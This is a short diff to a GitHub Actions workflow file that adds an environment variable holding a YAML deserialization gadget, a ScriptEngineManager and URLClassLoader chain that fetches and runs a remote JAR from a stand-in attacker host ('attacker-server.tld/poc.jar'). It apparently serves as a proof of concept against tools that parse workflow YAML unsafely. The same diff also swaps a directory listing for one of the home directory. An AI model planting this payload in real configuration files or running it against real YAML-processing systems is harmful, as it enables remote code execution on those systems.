@@ -5,11 +5,12 @@ on: [ push ]
 jobs:
     change-working-dir:
         runs-on: ubuntu-latest
+        env:
+          some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker-server.tld/poc.jar"]]]]
         steps:
             - name: job_1
-              uses: actions/checkout@v2**
               run: |
-                  ls ./.github
+                ls $HOME
     # invoke-docker:
     #     runs-on: self-hosted
     #     steps:
